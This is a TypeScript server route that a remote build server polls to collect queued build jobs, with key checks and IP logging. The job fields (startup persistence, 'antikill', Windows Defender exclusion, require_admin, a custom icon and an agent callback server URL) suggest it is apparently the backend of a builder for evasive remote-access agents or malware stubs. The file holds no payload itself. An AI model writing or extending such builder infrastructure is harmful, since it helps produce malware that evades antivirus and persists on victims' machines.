import { createFileRoute } from '@tanstack/react-router'

async function verifyBuildserverKey(request: Request): Promise<boolean> {
  const key = request.headers.get('x-buildserver-key')
  if (!key) return false
  const { supabaseAdmin } = await import('@/integrations/supabase/client.server')
  const { data } = await supabaseAdmin
    .from('build_server_config')
    .select('id')
    .eq('key', key)
    .maybeSingle()
  return !!data
}

const PROJECT_ID = '7b74ebe1-139a-493e-94a5-3e52cba1d8d3'
const STABLE_DEV = `https://project--${PROJECT_ID}-dev.lovable.app`

function normalizeAgentTarget(url: string | null | undefined) {
  if (!url) return STABLE_DEV
  if (url.includes('lovableproject.com') || url.includes('id-preview--')) return STABLE_DEV
  if (/project--[0-9a-f-]+(-dev)?\.lovable\.app/i.test(url) && !url.includes(PROJECT_ID)) {
    return STABLE_DEV
  }
  return url.replace(/\/$/, '')
}

export const Route = createFileRoute('/api/public/buildserver/poll')({
  server: {
    handlers: {
      GET: async ({ request }) => {
        if (!(await verifyBuildserverKey(request))) {
          return new Response('Unauthorized', { status: 401 })
        }

        // Mark this buildserver as alive (used by the Builder tab's online dot).
        const key = request.headers.get('x-buildserver-key')!
        const ua = request.headers.get('user-agent') ?? 'unknown'
        const ip = request.headers.get('cf-connecting-ip')
          ?? request.headers.get('x-forwarded-for')
          ?? 'unknown'
        const { supabaseAdmin } = await import('@/integrations/supabase/client.server')
        await supabaseAdmin
          .from('build_server_config')
          .update({ last_seen_at: new Date().toISOString() })
          .eq('key', key)
        console.log(`[buildserver] poll ← ${ip} (${ua}) key=${key.slice(0, 14)}…`)

        const { data: builds } = await supabaseAdmin
          .from('builds')
          .select('id, user_id, name, startup, startup_name, debug, antikill, wd_exclusion, require_admin, tag, output_kind, icon_url, target_server_url')
          .eq('status', 'queued')
          .order('created_at', { ascending: true })
          .limit(1)

        if (builds && builds.length > 0) {
          builds[0].target_server_url = normalizeAgentTarget(builds[0].target_server_url)
          await supabaseAdmin
            .from('builds')
            .update({ status: 'building', progress: 0, target_server_url: builds[0].target_server_url })
            .eq('id', builds[0].id)
          console.log(`[buildserver] dispatch → build ${builds[0].id.slice(0,8)}… (${builds[0].name})`)
        }

        return new Response(JSON.stringify({ builds: builds || [] }), {
          headers: { 'Content-Type': 'application/json' },
        })
      },
    },
  },
})
